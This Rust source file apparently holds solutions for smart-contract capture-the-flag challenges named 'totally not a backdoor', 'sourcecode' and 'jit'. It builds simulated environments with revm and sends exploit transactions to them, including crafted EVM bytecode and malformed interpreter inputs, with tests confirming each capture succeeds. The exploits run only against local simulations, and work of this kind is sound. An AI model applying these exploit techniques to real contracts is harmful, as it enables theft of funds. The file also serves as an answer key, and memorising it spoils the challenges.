use anyhow::Error;
use ethers_core::{
    abi::{parse_abi, Token},
    types::H160,
};
use revm::primitives::{
    alloy_primitives::U160, hex::FromHex, Address, Bytecode, Bytes, HashMap, HashSet, SpecId,
    TransactTo, U256,
};

use crate::{
    db::BlockConfig,
    types::{Account, Environment, Secret, TargetCondition, Transaction, TxSim},
};

use self::constants::*;

mod constants;

pub fn totally_not_a_backdoor() -> Result<Secret, Error> {
    let allowed_account = Address::from(U160::from(16));
    let target_contract = Address::from(U160::from(17));
    let env = Environment {
        spec: SpecId::LATEST,
        block_config: BlockConfig::default(),
        allowed_accounts: HashSet::from_iter([allowed_account]),
        accounts: HashMap::from_iter([
            (allowed_account, Account::new(U256::ZERO, None)),
            (
                target_contract,
                Account::new(
                    U256::ZERO,
                    Some(Bytecode::new_raw(
                        Bytes::from_hex(TOTALLY_NOT_A_BACKDOOR_BYTECODE).unwrap(),
                    )),
                ),
            ),
        ]),
        storage: HashMap::new(),
        target_condition: TargetCondition::new_captured(target_contract),
    };

    let abi = parse_abi(&["function notABackdoor(address)", "function capture()"])?;
    let txs =
        vec![
            TxSim::Transaction(Transaction {
                caller: allowed_account,
                transact_to: TransactTo::Call(target_contract),
                value: U256::ZERO,
                data: Bytes::from(abi.function("notABackdoor")?.encode_input(&[
                    Token::Address(H160::from_slice(allowed_account.as_slice())),
                ])?),
                nonce: 0,
                gas_limit: None,
                access_list: vec![],
            }),
            TxSim::Transaction(Transaction {
                caller: allowed_account,
                transact_to: TransactTo::Call(target_contract),
                value: U256::ZERO,
                data: Bytes::from(abi.function("capture")?.encode_input(&[])?),
                nonce: 1,
                gas_limit: None,
                access_list: vec![],
            }),
        ];

    Ok(Secret {
        submitter: H160::from_slice(allowed_account.as_slice()),
        txs,
        enviroment: env,
    })
}

pub fn sourcecode() -> Result<Secret, Error> {
    let allowed_account = Address::from(U160::from(16));
    let target_contract = Address::from(U160::from(17));
    let env = Environment {
        spec: SpecId::LATEST,
        block_config: BlockConfig::default(),
        allowed_accounts: HashSet::from_iter([allowed_account]),
        accounts: HashMap::from_iter([
            (allowed_account, Account::new(U256::ZERO, None)),
            (
                target_contract,
                Account::new(
                    U256::ZERO,
                    Some(Bytecode::new_raw(
                        Bytes::from_hex(SOURCECODE_BYTECODE).unwrap(),
                    )),
                ),
            ),
        ]),
        storage: HashMap::new(),
        target_condition: TargetCondition::new_captured(target_contract),
    };

    let abi = parse_abi(&["function submitCode(bytes)", "function capture()"])?;
    let txs = vec![
            TxSim::Transaction(Transaction {
                caller: allowed_account,
                transact_to: TransactTo::Call(target_contract),
                value: U256::ZERO,
                data: Bytes::from(abi.function("submitCode")?.encode_input(&[Token::Bytes(
                    ethers_core::abi::Bytes::from_hex("0x7f806cffffffffffffffffffffffffff50600152602152607f60005360416000f3806cffffffffffffffffffffffffff50600152602152607f60005360416000f3").unwrap(),
                )])?),
                nonce: 0,
                gas_limit: None,
                access_list: vec![],
            }),
            TxSim::Transaction(Transaction {
                caller: allowed_account,
                transact_to: TransactTo::Call(target_contract),
                value: U256::ZERO,
                data: Bytes::from(abi.function("capture")?.encode_input(&[])?),
                nonce: 1,
                gas_limit: None,
                access_list: vec![],
            }),
        ];

    Ok(Secret {
        submitter: H160::from_slice(allowed_account.as_slice()),
        txs,
        enviroment: env,
    })
}

pub fn jit() -> Result<Secret, Error> {
    let allowed_account = Address::from(U160::from(16));
    let target_contract = Address::from(U160::from(17));
    let env = Environment {
        spec: SpecId::LATEST,
        block_config: BlockConfig::default(),
        allowed_accounts: HashSet::from_iter([allowed_account]),
        accounts: HashMap::from_iter([
            (allowed_account, Account::new(U256::ZERO, None)),
            (
                target_contract,
                Account::new(
                    U256::ZERO,
                    Some(Bytecode::new_raw(Bytes::from_hex(JIT_BYTECODE).unwrap())),
                ),
            ),
        ]),
        storage: HashMap::new(),
        target_condition: TargetCondition::new_captured(target_contract),
    };

    let abi = parse_abi(&["function invoke(bytes,bytes)", "function capture()"])?;
    let txs = vec![
        TxSim::Transaction(Transaction {
            caller: allowed_account,
            transact_to: TransactTo::Call(target_contract),
            value: U256::ZERO,
            data: Bytes::from(abi.function("invoke")?.encode_input(&[
                Token::Bytes(b"[#######################]".to_vec()),
                Token::Bytes(b"".to_vec()),
            ])?),
            nonce: 0,
            gas_limit: None,
            access_list: vec![],
        }),
        TxSim::Transaction(Transaction {
            caller: allowed_account,
            transact_to: TransactTo::Call(target_contract),
            value: U256::ZERO,
            data: Bytes::from(abi.function("invoke")?.encode_input(&[
                Token::Bytes(b"########################[]".to_vec()),
                Token::Bytes(b"".to_vec()),
            ])?),
            nonce: 1,
            gas_limit: None,
            access_list: vec![],
        }),
        TxSim::Transaction(Transaction {
            caller: allowed_account,
            transact_to: TransactTo::Call(target_contract),
            value: U256::ZERO,
            data: Bytes::from(abi.function("invoke")?.encode_input(&[
                Token::Bytes(b"[################\x64S[\xff".to_vec()),
                Token::Bytes(b"".to_vec()),
            ])?),
            nonce: 2,
            gas_limit: None,
            access_list: vec![],
        }),
        TxSim::Transaction(Transaction {
            caller: allowed_account,
            transact_to: TransactTo::Call(target_contract),
            value: U256::ZERO,
            data: Bytes::from(abi.function("capture")?.encode_input(&[])?),
            nonce: 3,
            gas_limit: None,
            access_list: vec![(target_contract, vec![U256::ZERO])],
        }),
    ];

    Ok(Secret {
        submitter: H160::from_slice(allowed_account.as_slice()),
        txs,
        enviroment: env,
    })
}

#[cfg(test)]
mod tests {
    use crate::transact;

    #[test]
    fn test_totally_not_a_backdoor() {
        let secret = crate::secrets::totally_not_a_backdoor().expect("Should contruct secret");
        let _result = transact(secret).expect("Should not revert");
    }

    #[test]
    fn test_sourcecode() {
        let secret = crate::secrets::sourcecode().expect("Should contruct secret");
        let _result = transact(secret).expect("Should not revert");
    }

    #[test]
    fn test_jit() {
        let secret = crate::secrets::jit().expect("Should contruct secret");
        let _result = transact(secret).expect("Should not revert");
    }
}
